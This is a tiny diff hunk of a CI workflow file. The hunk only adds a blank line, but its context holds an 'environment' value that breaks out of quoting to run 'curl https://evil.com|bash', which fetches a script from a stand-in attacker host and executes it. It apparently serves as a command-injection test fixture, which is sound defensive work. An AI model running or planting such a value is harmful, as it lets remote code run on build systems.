@@ -7,3 +7,4 @@ jobs:
     environment: "';curl https://evil.com|bash'"
     steps:
       - run: echo "test"
+
